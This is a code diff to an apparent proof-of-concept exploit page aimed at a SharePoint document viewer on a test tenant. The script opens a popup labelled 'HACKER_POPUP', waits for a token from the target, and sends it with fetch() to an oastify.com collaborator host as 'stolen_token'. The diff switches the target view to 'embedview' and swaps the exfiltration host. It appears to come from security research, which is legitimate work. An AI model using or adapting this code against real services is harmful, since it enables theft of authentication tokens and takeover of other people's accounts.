@@ -9,7 +9,8 @@
 
     <script>
         // TARGET CONFIGURATION
-        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=default";
+        // Use 'embedview' to load the editor directly (avoids nested iframe issues of 'default')
+        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=embedview";
         const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
         const exploitId = "HACKER_POPUP";
         let popup = null;
@@ -89,7 +90,7 @@
 
                 if (token) {
                     log("SUCCESS! Token found.");
-                    fetch('https://jf2a0pqj01lqqxn3wf9oagurkiq9e32s.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
+                    fetch('https://vrqmc12vcdx229zf8rl0ms63wu2lqge5.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
                 } else {
                     log("ERROR: Message received but Token field is empty or named differently.");
                 }
